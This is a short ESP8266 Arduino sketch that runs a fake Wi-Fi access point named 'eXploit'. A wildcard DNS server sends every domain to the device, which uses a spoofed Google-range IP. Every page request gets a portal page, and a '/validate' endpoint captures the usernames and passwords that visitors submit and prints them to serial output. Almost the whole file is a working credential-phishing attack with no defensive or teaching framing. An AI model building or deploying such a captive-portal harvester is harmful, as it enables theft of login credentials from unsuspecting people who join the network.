#include "WebHTML.h"
#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

#ifndef APSSID
#define APSSID "eXploit"
#define APPSK  "vulnerable"
#endif
const char *ssid = APSSID;
const char *password = APPSK;

IPAddress apIP(172, 217, 28, 1);
const byte DNS_PORT = 53;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

void handleConfig() {
  webServer.send(200, "text/html", WELCOME_HTML);
}

void setup() {
  delay(1000);
  Serial.begin(115200);
  Serial.println();
  Serial.print("Configuring access point...");


  WiFi.softAP(ssid, password);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.onNotFound([]() {
  webServer.send(200, "text/html", ROOT_HTML);
  });
  webServer.begin();
  
  webServer.on("/validate", []() {
  String url = webServer.arg("url");
  String user = webServer.arg("user");
  String pass = webServer.arg("pass");
  Serial.println(user);
  Serial.println(pass); });

  webServer.on("/", handleConfig);
       
}

void loop() {
  webServer.handleClient();
  dnsServer.processNextRequest();
}
